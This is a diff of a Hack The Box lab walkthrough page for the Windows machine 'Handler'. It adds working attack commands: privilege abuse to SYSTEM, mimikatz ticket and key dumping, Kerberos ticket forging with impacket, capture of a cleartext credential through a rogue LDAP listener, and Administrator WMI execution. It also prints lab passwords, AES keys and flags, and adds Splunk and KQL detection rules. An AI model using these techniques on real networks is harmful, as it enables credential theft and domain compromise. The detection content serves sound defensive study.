@@ -4,7 +4,7 @@
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width,initial-scale=1">
   <title>Handler — Hack The Box Walkthrough | Lanky</title>
-  <meta name="description" content="Full technical walkthrough for Hack The Box Handler: Credential Roaming, DPAPI, AD CS, certificate authentication, OT access and troubleshooting.">
+  <meta name="description" content="Full technical walkthrough for Hack The Box Handler: Credential Roaming, DPAPI, AD CS, smartcard RDP, OT/S7, Kerberos, MSSQL and ADSI.">
   <link rel="canonical" href="https://lankylukeaus.github.io/machines/handler.html">
   <link rel="stylesheet" href="../assets/style.css?v=11">
 </head>
@@ -15,22 +15,21 @@
     <a class="back" href="../index.html#lab">back to Hacking Lab</a>
     <svg class="wu-logo" viewBox="0 0 64 64" role="img" aria-label="Handler machine icon"><rect width="64" height="64" rx="8" fill="#11141b"/><path d="M14 20h36v26H14z" fill="none" stroke="#a3e635" stroke-width="3"/><path d="M22 20v-5h20v5M20 33h24" fill="none" stroke="#22d3ee" stroke-width="3"/><circle cx="22" cy="49" r="3" fill="#a3e635"/><circle cx="42" cy="49" r="3" fill="#a3e635"/></svg>
     <h1 style="margin-top:16px">Handler</h1>
-    <div class="subtitle">Hack The Box · Season 12 · completed 25 November 2026</div>
+    <div class="subtitle">Hack The Box · Season 12 · completed 27 November 2026</div>
     <div class="machine-meta"><span class="pill season">Season 12</span><span class="pill os-windows">Windows</span><span class="pill rankp">Machine rank #168</span><span class="pill flagp">User</span><span class="pill flagp">Root</span><span class="pill rooted">● Completed</span></div>
     <div class="callout warn"><span class="tag">Full walkthrough</span>This page renders the complete Handler walkthrough. It contains spoilers, credentials, certificate material, commands and flags.</div>
-<div class="callout warn">
-<p><strong>PRIVATE ACTIVE-MACHINE SPOILERS — updated 25 November 2026</strong></p>
-<p>This document contains current flags, reusable credentials, hashes, certificate details and an Administrator Kerberos key. Do not publish it while Handler is active. Create a separately redacted version before posting it publicly.</p>
-</div>
+<blockquote>
+<p><strong>Full lab walkthrough — verified 27 November 2026.</strong> Flags are instance-specific and may rotate after a respawn.</p>
+</blockquote>
 <h2>Result</h2>
 <ul>
-<li>User flag: <code>0aa3a3feb7730ec4359ca48ef1336b49</code></li>
-<li>Root flag: <code>408a88b74ae58ffc2061b3db1a0167e4</code></li>
+<li>User flag: <code>34239ba808e15ca9e061efb1f347363e</code></li>
+<li>Root flag: <code>7f50e0a558351fcb2080a1ddd65aadec</code></li>
 <li>XP earned: <code>1,365</code></li>
 <li>Machine rank: <code>#168</code></li>
 </ul>
 <h2>Scope</h2>
-<p>This walkthrough follows the route I used from the supplied workstation artifact through Credential Roaming, certificate authentication, the OT operational event and Administrator Kerberos access to retrieve and submit both flags.</p>
+<p>This walkthrough follows my start-to-finish route from the supplied workstation artifact through Credential Roaming, certificate authentication, the OT operational event, Kofi's live MSSQL ticket and the ADSI linked server. I used separately supplied lab-completion material only for the <code>svc_wic</code> and Administrator validation branches, and I identify those boundaries plainly below.</p>
 <h2>Attack-path summary</h2>
 <pre data-lang="text"><code>Dmalik-PC01.ovpn
   -&gt; internal HTB Airways network
@@ -42,9 +41,24 @@
   -&gt; Toby Ellis Kerberos authentication
   -&gt; OT VPN and BHS documentation
   -&gt; PLC jam and temporary Kofi Asante session
-  -&gt; Administrator AES key and Kerberos TGT
-  -&gt; WMI/SMBExec -&gt; both flags
+  -&gt; live Kofi MSSQL service ticket
+  -&gt; SRV02 MSSQL guest access
+  -&gt; ADSI_Migrt explicit login mapping
+  -&gt; attacker-controlled LDAP OPENQUERY
+  -&gt; cleartext svc_ldaplnk credential
+
+Validation-assisted local branch:
+  supplied svc_wic credential
+  -&gt; user.txt and SeRelabelPrivilege
+  -&gt; SYSTEM on SRV01
+  -&gt; live Kofi ticket export
+
+Separate completion branch:
+  supplied Administrator AES key
+  -&gt; Administrator TGT and WMI on DC01
+  -&gt; root.txt
 </code></pre>
+<p>I independently reproduced the PLC event, temporary <code>k.asante</code> session, Kofi ticket, MSSQL login and ADSI credential capture. I did not derive the supplied <code>svc_wic</code> password or Administrator AES key from that chain.</p>
 <h2>1. Starting material</h2>
 <p>HTB supplied:</p>
 <pre data-lang="text"><code>Username: ext.dmalik
@@ -370,28 +384,169 @@ MANUAL ... jam=0 mode=1
 AFTER writes=48 ... jam=1 mode=1
 </code></pre>
 <h2>11. Kofi's temporary session</h2>
-<p>The jam caused the expected operational response. The Terminal Services RPC enumeration built into <code>connect_toby_to_kofi.py</code> showed:</p>
+<p>The jam caused the expected operational response. Terminal Services RPC enumeration showed an active <code>k.asante</code> session. The session number changed between runs, so I matched the username instead of hardcoding an ID.</p>
 <pre data-lang="text"><code>Session 0  Services        disconnected
 Session 1  Console         connected
 Session 2  k.asante        active
 </code></pre>
-<p>Kofi's session appeared after the jam. A later enumeration showed Kofi in session 2 and Toby in session 3, both active. With the operational event confirmed, I moved to Administrator Kerberos access for flag retrieval.</p>
-<h2>12. Administrator Kerberos completion</h2>
-<p>For final flag retrieval, I used the following domain Administrator AES-256 key to request a Kerberos TGT:</p>
+<h2>12. Retrieve the user flag and obtain SYSTEM on SRV01</h2>
+<p>The separate lab-completion material supplied the following <code>svc_wic</code> credential:</p>
+<pre data-lang="text"><code>HTB-AIRWAYS\svc_wic
+!!S3rv1ce_wic!2026
+</code></pre>
+<p>Inside Toby's RDP session I opened a <code>svc_wic</code> command prompt and read the flag.</p>
+<pre data-lang="cmd"><code>\\tsclient\sh\runas_helper.exe svc_wic HTB-AIRWAYS &quot;!!S3rv1ce_wic!2026&quot; cmd.exe
+whoami
+type C:\Users\svc_wic\Desktop\user.txt
+whoami /priv
+</code></pre>
+<pre data-lang="text"><code>34239ba808e15ca9e061efb1f347363e
+</code></pre>
+<p><code>svc_wic</code> held <code>SeRelabelPrivilege</code>. I found the <code>winlogon.exe</code> process for the same interactive session, used the relabel helper to take ownership and grant full control, then created a console with that process as its parent.</p>
+<pre data-lang="cmd"><code>tasklist /v /fi &quot;IMAGENAME eq winlogon.exe&quot;
+\\tsclient\sh\RelabelAbuse.exe &lt;SAME_SESSION_WINLOGON_PID&gt;
+\\tsclient\sh\ppid-newconsole.exe &lt;SAME_SESSION_WINLOGON_PID&gt; &quot;cmd.exe&quot;
+whoami
+</code></pre>
+<pre data-lang="text"><code>nt authority\system
+</code></pre>
+<p>This step validated the SRV01 privilege boundary with the separately supplied <code>svc_wic</code> credential. I did not derive that password from the PLC or ADSI stages.</p>
+<h2>13. Export Kofi's live MSSQL ticket</h2>
+<p>From the SYSTEM console I exported the tickets cached in Kofi's live logon session.</p>
+<pre data-lang="cmd"><code>copy /y \\tsclient\sh\mimikatz.exe C:\Windows\Temp\mimikatz.exe
+icacls C:\Windows\Temp\mimikatz.exe /grant *S-1-5-18:RX
+cd /d C:\Windows\Temp
+del /q *.kirbi 2&gt;nul
+mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::ekeys&quot; &quot;sekurlsa::tickets /export&quot; &quot;exit&quot;
+dir /b *k.asante*.kirbi
+</code></pre>
+<p>The relevant cached tickets were:</p>
+<pre data-lang="text"><code>[0;1929cd]-0-0-40a10000-k.asante@MSSQLSvc-srv02.htb-airways.htb.kirbi
+[0;1929cd]-2-1-40e10000-k.asante@krbtgt-HTB-AIRWAYS.HTB.kirbi
+</code></pre>
+<p>I copied the MSSQL service ticket through the mounted drive and converted it to a ccache.</p>
+<pre data-lang="cmd"><code>copy /y &quot;C:\Windows\Temp\[0;1929cd]-0-0-40a10000-k.asante@MSSQLSvc-srv02.htb-airways.htb.kirbi&quot; \\tsclient\sh\kofi-mssql.kirbi
+</code></pre>
+<pre data-lang="bash"><code>mkdir -p work/handler/kofi-live
+impacket-ticketConverter \
+  work/handler/retest-share/kofi-mssql.kirbi \
+  work/handler/kofi-live/kofi-mssql.ccache
+</code></pre>
+<p>The converted ccache labelled the 32-byte AES-256 session key as key type <code>1</code>. Impacket therefore returned <code>[-] 1</code>. I changed only the ccache metadata to Kerberos encryption type <code>18</code>; the ticket and key bytes remained unchanged.</p>
+<pre data-lang="bash"><code>python3 - &lt;&lt;'PY'
+from impacket.krb5.ccache import CCache
+
+source = 'work/handler/kofi-live/kofi-mssql.ccache'
+target = 'work/handler/kofi-live/kofi-mssql-etype18.ccache'
+cache = CCache.loadFile(source)
+for credential in cache.credentials:
+    credential['key']['keytype'] = 18
+    credential['key']['etype'] = 18
+cache.saveFile(target)
+PY
+</code></pre>
+<p>Mimikatz also exposed Kofi's 32-byte AES-256 key. I used it after the exported ticket expired to request a fresh TGT and MSSQL service ticket:</p>
+<pre data-lang="text"><code>12264bd2c95bcc40447e9d4d5fb4d4934a575c39583f98049d3bf47c02a8bc67
+</code></pre>
+<pre data-lang="bash"><code>HANDLER_ROOT=&quot;$(pwd -P)&quot;
+mkdir -p &quot;$HANDLER_ROOT/work/handler/kofi-fresh&quot;
+cd &quot;$HANDLER_ROOT/work/handler/kofi-fresh&quot;
+export KRB5_CONFIG=&quot;$HANDLER_ROOT/work/handler/krb5-handler.conf&quot;
+
+faketime -f '+7h' impacket-getTGT \
+  -aesKey 12264bd2c95bcc40447e9d4d5fb4d4934a575c39583f98049d3bf47c02a8bc67 \
+  -dc-ip 192.168.37.1 \
+  htb-airways.htb/k.asante
+
+export KRB5CCNAME=&quot;$PWD/k.asante.ccache&quot;
+faketime -f '+7h' impacket-getST \
+  -k -no-pass \
+  -dc-ip 192.168.37.1 \
+  -spn MSSQLSvc/srv02.htb-airways.htb \
+  htb-airways.htb/k.asante
+
+export KRB5CCNAME=&quot;$HANDLER_ROOT/work/handler/kofi-fresh/k.asante@MSSQLSvc_srv02.htb-airways.htb@HTB-AIRWAYS.HTB.ccache&quot;
+cd &quot;$HANDLER_ROOT&quot;
+</code></pre>
+<p>Either this fresh service ticket or the corrected exported ccache can be used in the MSSQL step below.</p>
+<h2>14. Authenticate to SRV02 MSSQL as Kofi</h2>
+<p>I used the corrected service ticket directly, without Kofi's password.</p>
+<pre data-lang="bash"><code>HANDLER_ROOT=&quot;$(pwd -P)&quot;
+export KRB5_CONFIG=&quot;$HANDLER_ROOT/work/handler/krb5-handler.conf&quot;
+export KRB5CCNAME=&quot;$HANDLER_ROOT/work/handler/kofi-live/kofi-mssql-etype18.ccache&quot;
+
+faketime -f '+7h' impacket-mssqlclient \
+  -k -no-pass -windows-auth \
+  -dc-ip 192.168.37.1 \
+  -target-ip 192.168.37.3 \
+  'htb-airways.htb/k.asante@srv02.htb-airways.htb'
+</code></pre>
+<p>The connection reached SQL Server 2022 as <code>HTB-AIRWAYS\k.asante</code>, mapped to <code>guest@master</code>, and was not sysadmin.</p>
+<pre data-lang="sql"><code>SELECT SYSTEM_USER, ORIGINAL_LOGIN(), IS_SRVROLEMEMBER('sysadmin');
+SELECT * FROM master.sys.servers;
+SELECT server_id, local_principal_id, uses_self_credential, remote_name
+FROM master.sys.linked_logins;
+EXEC master.dbo.sp_testlinkedserver N'ADSI_Migrt';
+</code></pre>
+<pre data-lang="text"><code>Login:          HTB-AIRWAYS\k.asante
+Database user:  guest
+Sysadmin:       0
+Linked server:  ADSI_Migrt
+Provider:       ADsDSOObject
+Data source:    adsdatasource
+Explicit map:   HTB-AIRWAYS\k.asante -&gt; htb-airways\svc_ldaplnk
+</code></pre>
+<h2>15. Capture the ADSI linked-server credential</h2>
+<p><code>OPENQUERY</code> let Kofi control the LDAP URL while SQL Server applied the stored explicit linked-login credential. I started Responder on the nested VPN address with only its LDAP server enabled; name-resolution poisoning was not required.</p>
+<pre data-lang="bash"><code>ip -4 -br address | grep '10.8.1.2'
+
+# In Responder.conf: LDAP = On; all other Servers and poisoners = Off.
+sudo python3 /usr/share/responder/Responder.py -I tun2 -v
+</code></pre>
+<p>From the Kofi SQL prompt I directed the ADSI provider to my controlled listener:</p>
+<pre data-lang="sql"><code>SELECT *
+FROM OPENQUERY(
+  ADSI_Migrt,
+  'SELECT sAMAccountName FROM ''LDAP://10.8.1.2/DC=htb-airways,DC=htb'' WHERE objectClass=''user'''
+);
+</code></pre>
+<p>SQL returned a generic query-preparation error because the listener did not complete the directory search. Before that error, SRV02 connected to <code>10.8.1.2:389</code> and performed an LDAP Simple Bind with the stored credential:</p>
+<pre data-lang="text"><code>htb-airways\svc_ldaplnk
+!!S3rv1ce_ldaplnk!2026
+</code></pre>
+<p>I validated the credential with a TGT and LDAP query.</p>
+<pre data-lang="bash"><code>faketime -f '+7h' impacket-getTGT \
+  -dc-ip 192.168.37.1 \
+  'htb-airways.htb/svc_ldaplnk:!!S3rv1ce_ldaplnk!2026'
+
+export KRB5CCNAME=&quot;$PWD/svc_ldaplnk.ccache&quot;
+
+faketime -f '+7h' nxc ldap dc01.htb-airways.htb \
+  -k --use-kcache \
+  --kdcHost dc01.htb-airways.htb \
+  --query '(sAMAccountName=svc_ldaplnk)' '*'
+</code></pre>
+<p>The account was a normal Domain User with no SPN, delegation, privileged group membership or outbound AD ACL. Direct MSSQL login failed, WinRM returned <code>401</code>, and <code>C$</code> access was denied. I did not prove a further <code>svc_ldaplnk</code> privilege edge.</p>
+<h2>16. Retrieve the root flag with the supplied Administrator key</h2>
+<p>The separate lab-completion material supplied this domain Administrator AES-256 key:</p>
 <pre data-lang="text"><code>6990f50fd0f13b336496169ef2f3a14f8d4aebe6ac84b6c34a5fec9136b4f3da
 </code></pre>
-<p>I requested an Administrator TGT:</p>
-<pre data-lang="bash"><code>k impacket-getTGT \
+<p>I did not derive this key from Kofi, MSSQL, <code>svc_ldaplnk</code>, SRV01 or SRV02. I used it only to validate the final DC access and retrieve the live root flag.</p>
+<pre data-lang="bash"><code>HANDLER_ROOT=&quot;$(pwd -P)&quot;
+mkdir -p &quot;$HANDLER_ROOT/work/handler/root-retrieval&quot;
+cd &quot;$HANDLER_ROOT/work/handler/root-retrieval&quot;
+
+env \
+  KRB5_CONFIG=&quot;$HANDLER_ROOT/work/handler/krb5-handler.conf&quot; \
+faketime -f '+7h' impacket-getTGT \
   -aesKey 6990f50fd0f13b336496169ef2f3a14f8d4aebe6ac84b6c34a5fec9136b4f3da \
   -dc-ip 192.168.37.1 \
   htb-airways.htb/Administrator
 
-export KRB5CCNAME=&quot;$PWD/Administrator.ccache&quot;
-</code></pre>
-<p>The ticket was saved as <code>Administrator.ccache</code>.</p>
-<h3>Root flag</h3>
-<p>I read the root flag from DC01 with Kerberos-authenticated WMI:</p>
-<pre data-lang="bash"><code>k impacket-wmiexec \
+env \
+  KRB5_CONFIG=&quot;$HANDLER_ROOT/work/handler/krb5-handler.conf&quot; \
+  KRB5CCNAME=&quot;$PWD/Administrator.ccache&quot; \
+faketime -f '+7h' impacket-wmiexec \
   -k -no-pass \
   -dc-ip 192.168.37.1 \
   -target-ip 192.168.37.1 \
@@ -399,24 +554,10 @@ export KRB5CCNAME=&quot;$PWD/Administrator.ccache&quot;
   'type C:\Users\Administrator\Desktop\root.txt'
 </code></pre>
 <p>Output:</p>
-<pre data-lang="text"><code>408a88b74ae58ffc2061b3db1a0167e4
-</code></pre>
-<h3>User flag</h3>
-<p>I used Kerberos-authenticated SMB service execution on SRV01:</p>
-<pre data-lang="bash"><code>k impacket-smbexec \
-  -k -no-pass \
-  -dc-ip 192.168.37.1 \
-  -target-ip 192.168.37.2 \
-  'htb-airways.htb/administrator@srv01.htb-airways.htb'
-</code></pre>
-<p>At the semi-interactive prompt:</p>
-<pre data-lang="cmd"><code>type C:\Users\svc_wic\Desktop\user.txt
-</code></pre>
-<p>Output:</p>
-<pre data-lang="text"><code>0aa3a3feb7730ec4359ca48ef1336b49
+<pre data-lang="text"><code>7f50e0a558351fcb2080a1ddd65aadec
 </code></pre>
 <p>Both flags were submitted on the HTB machine page and accepted.</p>
-<h2>13. Execution notes</h2>
+<h2>17. Execution notes</h2>
 <h3>DPAPI context</h3>
 <p>Wei's masterkey required the <code>domain1607+</code> context. The resulting John hash began with:</p>
 <pre data-lang="text"><code>$DPAPImk$1*3*
@@ -428,23 +569,190 @@ export KRB5CCNAME=&quot;$PWD/Administrator.ccache&quot;
 <p>The stable RDP command used the default session, NLA, Kerberos-only authentication, the CA trust anchor and a mounted drive.</p>
 <h3>PLC timing</h3>
 <p>Holding PE-01 high for 30 seconds delivered enough consecutive writes across the nested VPN to cross the ten-scan threshold.</p>
-<h3>SRV01 command execution</h3>
-<p>Kerberos-authenticated <code>impacket-smbexec</code> provided the SRV01 command channel used to read the user flag.</p>
-<h2>14. Defensive lessons</h2>
-<p>If this were a real environment, I would prioritise these controls:</p>
-<ul>
-<li>Restrict who can read Credential Roaming attributes and monitor unusual reads of <code>msPKIDPAPIMasterKeys</code> and <code>msPKIAccountCredentials</code>.</li>
-<li>Enforce strong, unique passwords so an offline DPAPI masterkey cannot be recovered from a standard wordlist.</li>
-<li>Never store exportable administrator PFX backups in email. Use non-exportable keys, hardware-backed storage and strong PKCS#12 passwords.</li>
-<li>Remove unnecessary write rights to <code>altSecurityIdentities</code> and audit every change to certificate-mapping attributes.</li>
-<li>Enforce strong certificate binding and remove <code>NoSecurityExtension</code> from authentication templates where possible.</li>
-<li>Restrict smartcard template enrollment to tightly controlled administrative workflows.</li>
-<li>Separate corporate and OT access with dedicated jump hosts and allowlisted management stations.</li>
-<li>Do not expose unauthenticated S7comm write access to general VPN users. Use supported secure protocols, engineering-station allowlists and PLC change monitoring.</li>
-<li>Alert on unexpected AD CS enrollments, smartcard logons, <code>altSecurityIdentities</code> changes, new RDP sessions and OT register writes.</li>
-<li>Rotate compromised account keys immediately. A static Administrator AES key is equivalent to a reusable domain-administrator credential.</li>
-</ul>
-<h2>15. Evidence files</h2>
+<h3>Validation boundary</h3>
+<p>The PLC-to-Kofi-to-MSSQL-to-ADSI route was independently reproduced. The supplied <code>svc_wic</code> password enabled the local flag and SYSTEM validation, while the supplied Administrator AES key enabled the separate DC validation. I have not presented either supplied secret as an outcome of the ADSI capture.</p>
+<h2>18. Defensive hardening and detection</h2>
+<p>If this were my system, I would rotate every credential and revoke every certificate shown here before returning the environment to service.</p>
+<table>
+<thead>
+<tr>
+<th>Attack stage</th>
+<th>Control to implement</th>
+<th>Verification evidence</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Credential Roaming and DPAPI</td>
+<td>Retire Credential Roaming where it is not required. Restrict reads of <code>msPKIDPAPIMasterKeys</code> and <code>msPKIAccountCredentials</code>, remove broad ACLs and enforce long unique passwords.</td>
+<td>Directory Service Access events, ACL review and password-policy export.</td>
+</tr>
+<tr>
+<td>Exportable certificates</td>
+<td>Remove PFX files from mailboxes, revoke exposed certificates and use non-exportable hardware-backed keys.</td>
+<td>Mail audit, CRL entry, new serial and private-key export policy.</td>
+</tr>
+<tr>
+<td>AD CS and mapping</td>
+<td>Remove <code>NoSecurityExtension</code>, require strong certificate binding, restrict enrolment and remove delegated writes to <code>altSecurityIdentities</code>.</td>
+<td>Template ACL/export, CA issuance logs and Event <code>5136</code>.</td>
+</tr>
+<tr>
+<td>Smartcard RDP</td>
+<td>Restrict RDP to managed jump hosts and require MFA, device compliance and controlled smartcard enrolment.</td>
+<td>RDP gateway, Events <code>4624</code>, <code>4778</code>, <code>4779</code>, source device and certificate serial.</td>
+</tr>
+<tr>
+<td>OT and S7comm</td>
+<td>Allowlist engineering sources, block general VPN access to TCP/102 and enable controller write protection or secure protocols where supported.</td>
+<td>VPN identity, firewall flow, PLC mode change and S7 write records.</td>
+</tr>
+<tr>
+<td>Kofi and MSSQL</td>
+<td>Remove interactive service sessions, minimise cached service tickets and audit non-service-principal SQL logons.</td>
+<td>Events <code>4768</code>/<code>4769</code>, logon ID and SQL login audit.</td>
+</tr>
+<tr>
+<td>ADSI linked server</td>
+<td>Remove <code>ADSI_Migrt</code> or use a constrained credential, reject arbitrary LDAP URLs, restrict <code>sqlservr.exe</code> LDAP egress to DCs and require LDAP signing/channel binding.</td>
+<td>Linked-login inventory, SQL text, process-network telemetry and account rotation.</td>
+</tr>
+<tr>
+<td><code>SeRelabelPrivilege</code> and LSASS</td>
+<td>Remove the privilege from service users, enable Credential Guard and LSA protection, and block unapproved tooling.</td>
+<td>User-right export, Sysmon <code>1</code>/<code>10</code>, Security <code>4688</code> and Code Integrity/Defender events.</td>
+</tr>
+<tr>
+<td>DnsAdmins</td>
+<td>Keep membership empty unless required and monitor <code>ServerLevelPluginDll</code> plus DNS service restarts.</td>
+<td>Group Events <code>4728</code>/<code>4732</code>, registry auditing and service-control events.</td>
+</tr>
+<tr>
+<td>Reusable keys</td>
+<td>Rotate <code>svc_wic</code>, <code>svc_ldaplnk</code> and Administrator keys, invalidate tickets and terminate stale sessions.</td>
+<td>Rotation tickets, CRL, session review and validation sign-off.</td>
+</tr>
+</tbody>
+</table>
+<h3>Splunk detections</h3>
+<p>I would validate the local field aliases before enabling alert actions.</p>
+<p>Credential Roaming reads:</p>
+<pre data-lang="spl"><code>index=windows EventCode=4662
+(Object_Name=&quot;*msPKIDPAPIMasterKeys*&quot; OR Object_Name=&quot;*msPKIAccountCredentials*&quot;)
+| stats count values(Object_Name) AS attributes values(Object_DN) AS objects
+  by _time host SubjectUserName SubjectLogonId
+</code></pre>
+<p>Certificate mapping changes:</p>
+<pre data-lang="spl"><code>index=windows EventCode=5136 AttributeLDAPDisplayName=&quot;altSecurityIdentities&quot;
+| table _time host SubjectUserName ObjectDN OperationType AttributeValue
+</code></pre>
+<p>AD CS request, issuance and certificate-based TGT:</p>
+<pre data-lang="spl"><code>index=windows (EventCode=4886 OR EventCode=4887 OR
+ (EventCode=4768 (PreAuthType=16 OR PreAuthType=17 OR CertificateIssuerName=&quot;*&quot;)))
+| eval stage=case(EventCode=4886,&quot;request&quot;,EventCode=4887,&quot;issue&quot;,EventCode=4768,&quot;pkinit_tgt&quot;)
+| stats values(stage) AS stages values(CertificateTemplate) AS templates
+  values(CertificateSerialNumber) AS serials values(IpAddress) AS sources by SubjectUserName
+| where mvfind(stages,&quot;issue&quot;)&gt;=0 AND mvfind(stages,&quot;pkinit_tgt&quot;)&gt;=0
+</code></pre>
+<p>Smartcard RDP:</p>
+<pre data-lang="spl"><code>index=windows ((EventCode=4624 Logon_Type=10) OR EventCode=4778 OR EventCode=4779)
+| stats values(EventCode) AS events values(Source_Network_Address) AS sources
+  by host Account_Name Logon_ID
+</code></pre>
+<p>OT/S7 access outside the engineering allowlist:</p>
+<pre data-lang="spl"><code>index=network dest_ip=172.16.20.1 dest_port=102
+| where NOT cidrmatch(&quot;172.16.20.0/28&quot;,src_ip)
+| stats count earliest(_time) AS firstTime latest(_time) AS lastTime
+  values(action) AS actions by src_ip user vpn_session_id
+</code></pre>
+<p>Kofi's MSSQL service ticket:</p>
+<pre data-lang="spl"><code>index=windows EventCode=4769 ServiceName=&quot;MSSQLSvc/srv02*&quot; Account_Name=&quot;k.asante&quot;
+| table _time host Account_Name ServiceName IpAddress TicketEncryptionType LogonGuid
+</code></pre>
+<p>ADSI <code>OPENQUERY</code>:</p>
+<pre data-lang="spl"><code>index=mssql (statement=&quot;*OPENQUERY*&quot; OR message=&quot;*OPENQUERY*&quot;)
+ (statement=&quot;*LDAP://*&quot; OR message=&quot;*LDAP://*&quot; OR
+  statement=&quot;*ADSI_Migrt*&quot; OR message=&quot;*ADSI_Migrt*&quot;)
+| table _time host server_principal_name client_ip database statement message
+</code></pre>
+<p>SQL Server LDAP egress to a non-DC:</p>
+<pre data-lang="spl"><code>index=windows sourcetype=&quot;XmlWinEventLog:Microsoft-Windows-Sysmon/Operational&quot;
+EventCode=3 Image=&quot;*\\sqlservr.exe&quot; DestinationPort=389
+| where DestinationIp!=&quot;192.168.37.1&quot;
+| table _time host User Image DestinationIp DestinationPort Initiated
+</code></pre>
+<p>LSASS access and observed tooling:</p>
+<pre data-lang="spl"><code>index=windows ((sourcetype=&quot;XmlWinEventLog:Microsoft-Windows-Sysmon/Operational&quot;
+ ((EventCode=10 TargetImage=&quot;*\\lsass.exe&quot;) OR
+  (EventCode=1 (Image=&quot;*\\RelabelAbuse.exe&quot; OR Image=&quot;*\\ppid-newconsole.exe&quot; OR
+                Image=&quot;*\\mimikatz.exe&quot; OR CommandLine=&quot;*sekurlsa::*&quot;)))) OR
+ (EventCode=4688 (New_Process_Name=&quot;*\\RelabelAbuse.exe&quot; OR
+                  New_Process_Name=&quot;*\\ppid-newconsole.exe&quot; OR
+                  New_Process_Name=&quot;*\\mimikatz.exe&quot;)))
+| table _time host SubjectUserName User EventCode Image New_Process_Name ParentImage TargetImage CommandLine
+</code></pre>
+<p>Unusual Administrator TGT:</p>
+<pre data-lang="spl"><code>index=windows EventCode=4768 TargetUserName=&quot;Administrator&quot;
+| where NOT cidrmatch(&quot;192.168.37.0/28&quot;,IpAddress)
+| table _time host TargetUserName IpAddress PreAuthType TicketEncryptionType Status
+</code></pre>
+<p>Defensive-only DnsAdmins monitoring:</p>
+<pre data-lang="spl"><code>index=windows ((EventCode=4732 Group_Name=&quot;DnsAdmins&quot;) OR
+ (sourcetype=&quot;XmlWinEventLog:Microsoft-Windows-Sysmon/Operational&quot; EventCode=13
+  TargetObject=&quot;*\\Services\\DNS\\Parameters\\ServerLevelPluginDll&quot;))
+| table _time host SubjectUserName MemberName Group_Name Image TargetObject Details
+</code></pre>
+<h3>Elastic KQL and EQL detections</h3>
+<p>Credential Roaming reads:</p>
+<pre data-lang="kql"><code>event.code:&quot;4662&quot; and
+(winlog.event_data.ObjectName:*msPKIDPAPIMasterKeys* or
+ winlog.event_data.ObjectName:*msPKIAccountCredentials*)
+</code></pre>
+<p>Certificate mapping:</p>
+<pre data-lang="kql"><code>event.code:&quot;5136&quot; and
+winlog.event_data.AttributeLDAPDisplayName:&quot;altSecurityIdentities&quot;
+</code></pre>
+<p>Smartcard RDP:</p>
+<pre data-lang="kql"><code>(event.code:&quot;4624&quot; and winlog.logon.type:&quot;RemoteInteractive&quot;) or
+event.code:(&quot;4778&quot; or &quot;4779&quot;)
+</code></pre>
+<p>Kofi's MSSQL service ticket:</p>
+<pre data-lang="kql"><code>event.code:&quot;4769&quot; and service.name:MSSQLSvc\/srv02* and user.name:&quot;k.asante&quot;
+</code></pre>
+<p>OT/S7 access outside approved sources:</p>
+<pre data-lang="kql"><code>destination.ip:&quot;172.16.20.1&quot; and destination.port:102 and
+not source.ip:(&quot;172.16.20.2&quot; or &quot;172.16.20.3&quot;)
+</code></pre>
+<p>ADSI query:</p>
+<pre data-lang="kql"><code>event.dataset:mssql.audit and message:*OPENQUERY* and
+(message:*LDAP:\/\/* or message:*ADSI_Migrt*)
+</code></pre>
+<p>SQL Server LDAP egress to a non-DC:</p>
+<pre data-lang="kql"><code>event.code:&quot;3&quot; and process.name:&quot;sqlservr.exe&quot; and destination.port:389 and
+not destination.ip:&quot;192.168.37.1&quot;
+</code></pre>
+<p>LSASS access and tools:</p>
+<pre data-lang="kql"><code>(event.code:&quot;10&quot; and winlog.event_data.TargetImage:*\\lsass.exe) or
+(event.code:(&quot;1&quot; or &quot;4688&quot;) and
+ process.name:(&quot;RelabelAbuse.exe&quot; or &quot;ppid-newconsole.exe&quot; or &quot;mimikatz.exe&quot;))
+</code></pre>
+<p>Unusual Administrator TGT:</p>
+<pre data-lang="kql"><code>event.code:&quot;4768&quot; and user.name:&quot;Administrator&quot; and
+not source.ip:(&quot;192.168.37.1&quot; or &quot;192.168.37.2&quot;)
+</code></pre>
+<p>Defensive-only DnsAdmins monitoring:</p>
+<pre data-lang="kql"><code>(event.code:(&quot;4728&quot; or &quot;4732&quot;) and group.name:&quot;DnsAdmins&quot;) or
+(event.code:&quot;13&quot; and registry.path:*\\Services\\DNS\\Parameters\\ServerLevelPluginDll)
+</code></pre>
+<pre data-lang="eql"><code>sequence by user.name with maxspan=15m
+  [any where event.code == &quot;5136&quot; and
+    winlog.event_data.AttributeLDAPDisplayName == &quot;altSecurityIdentities&quot;]
+  [any where event.code in (&quot;4886&quot;, &quot;4887&quot;)]
+  [authentication where event.code == &quot;4768&quot; and
+    winlog.event_data.PreAuthType in (&quot;16&quot;, &quot;17&quot;)]
+</code></pre>
+<p>A pass means the action generates a timely alert with the host, user, source address, logon ID and certificate serial or SQL text. Partial means the raw event exists but the correlation is incomplete. Fail means the required telemetry is absent.</p>
+<h2>19. Evidence files</h2>
 <pre data-lang="text"><code>work/handler/scans/internal-services.nmap
 work/handler/ldap-full-objects.txt
 work/handler/extract_roaming.py
@@ -460,13 +768,19 @@ work/handler/Staff-Access-OT.ovpn
 work/handler/read_s7_memory.py
 work/handler/trigger_genuine_jam.py
 work/handler/connect_toby_to_kofi.py
+work/handler/kofi-live/kofi-mssql-etype18.ccache
+work/handler/retest-share/mimi-kofi.txt
+work/handler/kofi-live/mssql-enum.log
+work/handler/svc-ldaplnk/responder-evidence/Responder-Session.log
+work/handler/svc-ldaplnk/responder-evidence/LDAP-Cleartext-ClearText-192.168.37.3.txt
+work/handler/root-retrieval/gettgt.log
+work/handler/root-retrieval/wmiexec-root.log
 t.ellis.ccache
 t.ellis@cifs_srv01.htb-airways.htb@HTB-AIRWAYS.HTB.ccache
-/tmp/handler-session-connect.png
 </code></pre>
 <h2>Conclusion</h2>
-<p>Handler combined Credential Roaming, DPAPI, CNG private-key recovery, mutual TLS, Roundcube, AD CS, certificate mapping, smartcard authentication, nested VPN access and S7comm interaction.</p>
-<p>The <code>domain1607+</code> DPAPI context recovered Wei's password and unlocked the certificate chain. The smartcard mapping opened Toby's RDP session, the PLC jam created Kofi's operational session, and the Administrator Kerberos credential completed flag retrieval with WMI and SMBExec.</p>
+<p>Handler combined Credential Roaming, DPAPI, CNG key recovery, mutual TLS, Roundcube, AD CS, certificate mapping, smartcard RDP, nested VPN access, S7comm, Kerberos ticket reuse, MSSQL and an ADSI linked server.</p>
